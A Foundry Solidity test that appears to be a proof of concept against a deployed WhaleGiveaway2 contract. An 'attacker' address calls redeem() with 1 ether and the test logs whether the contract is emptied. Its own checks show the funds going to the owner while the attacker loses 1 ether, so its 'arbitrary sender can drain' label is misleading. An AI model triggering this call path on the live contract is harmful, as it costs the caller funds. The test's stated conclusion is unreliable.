// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x3f2ef511aa6e75231e4deafc7a3d2ecab3741de2.sol";

contract WhaleGiveaway2Test is Test {
    WhaleGiveaway2 giveaway;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    
    function setUp() public {
        vm.startPrank(owner);
        giveaway = new WhaleGiveaway2();
        vm.stopPrank();
        
        // Seed contract with 10 ETH and attacker with 1 ETH
        vm.deal(address(giveaway), 10 ether);
        vm.deal(attacker, 1 ether);
    }

    function test_ArbitrarySenderCanDrainContract() public {
        uint redemptionAmount = 1 ether; // Ensure minEligibility is satisfied

        // Record state BEFORE trigger
        uint initialContractBalance = address(giveaway).balance;
        uint initialOwnerBalance = owner.balance;
        uint initialAttackerBalance = attacker.balance;

        console.log("--- BEFORE-Trigger State ---");
        console.log("Contract Balance (ETH):", initialContractBalance);
        console.log("Owner Balance (ETH):", initialOwnerBalance);
        console.log("Attacker Balance (ETH):", initialAttackerBalance);

        console.log("--- Trigger: Attacker calls redeem with 1 ether ---");
        // Attacker triggers vulnerability
        vm.prank(attacker);
        giveaway.redeem{value: redemptionAmount}();

        // Record state AFTER trigger
        uint contractBalanceAfter = address(giveaway).balance;
        uint ownerBalanceAfter = owner.balance;
        uint attackerBalanceAfter = attacker.balance;

        console.log("--- AFTER-Trigger State ---");
        console.log("Contract Balance (ETH):", contractBalanceAfter);
        console.log("Owner Balance (ETH):", ownerBalanceAfter);
        console.log("Attacker Balance (ETH):", attackerBalanceAfter);

        // Verify balance changes
        bool contractFullyDrained = (contractBalanceAfter == 0);
        bool ownerReceivedFunds = (ownerBalanceAfter == initialOwnerBalance + initialContractBalance + redemptionAmount);
        bool attackerSpentFunds = (attackerBalanceAfter == initialAttackerBalance - redemptionAmount);
        bool vulnerabilityExists = contractFullyDrained && ownerReceivedFunds && attackerSpentFunds;

        // Final verdict
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Arbitrary sender can drain contract and owner received all funds");
        } else {
            console.log("Vulnerability not Exist: Contract drainage by arbitrary sender didn't occur as expected");
        }
    }
}